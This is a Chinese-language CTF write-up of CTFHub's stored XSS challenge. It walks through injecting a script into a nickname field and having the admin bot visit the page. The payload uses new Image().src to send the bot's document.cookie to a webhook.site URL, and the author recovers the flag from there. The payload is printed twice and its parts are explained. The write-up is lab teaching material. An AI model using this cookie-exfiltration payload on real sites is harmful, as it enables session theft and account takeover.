【CTFHub】Web-存储型XSS Writeup

操作者：何芊宏 | 操作日期：2026.9.21 | 分类：CTF | 标签：CTFHub, Web, XSS, 存储型, Webhook, OOB

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - XSS / 存储型
  • 题目名称：存储型
  • 提示：页面提供修改昵称的功能，且修改后会在页面上回显。目标是通过将XSS代码存入服务端，等待机器人（Bot）访问，从而窃取其Cookie。

2. 解题思路与知识点

存储型XSS原理：与反射型的最大区别在于“持久化”。恶意代码会被存入服务器的数据库，任何访问该页面的用户（包括管理员机器人）都会触发执行，无需构造钓鱼链接去诱导点击。

比喻说明：反射型XSS就像当面骂人（受害者必须在场）；而存储型XSS就像在黑板上写了一句坏话，只要管理员走过来看一眼，就会中招。

外带通道原理：Payload中的 new Image().src 会在内存中生成隐形图片，浏览器为了加载图片会自动发起GET请求。我们借此将 document.cookie 拼接到URL参数中悄悄外发。

3. 操作步骤

第一步：探测与验证漏洞

在 Change name 输入框中输入测试代码：

<script>alert(1)</script>

点击 Submit，页面成功弹窗。证明该输入点未经过滤，且代码被存储进了数据库。

第二步：构造并植入“外带炸弹”

获取 Webhook.site 的专属URL（需去掉带 #!/view/ 的前端锚点），并在 Change name 框内注入：

<script>new Image().src='https://webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689/?cookie='+document.cookie;</script>

点击 Submit 提交。此时自己的浏览器会先向 Webhook 发送一条数据（由于自己是测试者，通常 Cookie 为空，这是正常的）。

第三步：诱导机器人“踩雷”

复制靶场顶部的完整基础 URL（http://challenge-a460cd.../），粘贴到页面底部的 Send URL to Bot 输入框中，点击 Send。页面提示 Successfully，说明机器人正在后台访问这个已被植入恶意代码的页面。

第四步：捕获 Flag

返回 Webhook.site 页面，等待数秒。在左侧 INBOX 列表中找到包含非空 cookie 参数的新请求，提取出 Flag：

ctfhub{e4558e35e29e1fefa93e76ab}

提交至CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：502 Bad Gateway。开启靶场后直接访问链接，提示502错误（openresty/1.21.4.2）。这是靶场后端初始化慢或崩溃导致的。遇到此情况不要死磕，直接点击“停止并销毁环境”重新开启，等待10秒后再访问。
  • 坑2：Webhook 收到空 Cookie 导致自我怀疑。提交Payload后，Webhook 立刻收到了请求，但 cookie 参数为空。这是因为自己的浏览器执行了这段代码。需冷静区分：带机器人IP和Referer的请求才是真正的目标数据，不能因为看到空数据就以为攻击失败。
  • 坑3：发送URL的误区。反射型必须将包含代码的“靶场长URL”发送给Bot；而存储型只需发送靶场的“纯净基础URL”（因为代码已经存进数据库，只要访问这个页面就会执行）。

5. 知识总结

  • 反射型 vs 存储型：反射型是不落地（不存数据库），需要社工诱导点击；存储型是落地（存数据库），更具隐蔽性和危害性，只要页面被访问就会触发。
  • 外带Payload的代码结构拆解（复习巩固）：
    本次使用的Payload：<script>new Image().src='https://webhook.site/.../?cookie='+document.cookie;</script>
    依然由四个部分组成：
    1. 执行入口：<script>...</script>。告诉浏览器这段内容需要作为JavaScript代码执行。
    2. 隐蔽外发通道：new Image()。在内存中生成一个不显示在页面上的图片，设置其 .src 属性，浏览器会为了加载这张图而悄悄地发起GET请求。
    3. 拼接目标数据：+document.cookie。使用 JS 内置对象读取当前域下的 Cookie，通过 + 拼接成 URL 参数字符串。
    4. 数据接收端：'https://webhook.site/.../?cookie='。指定数据发送的目的地。
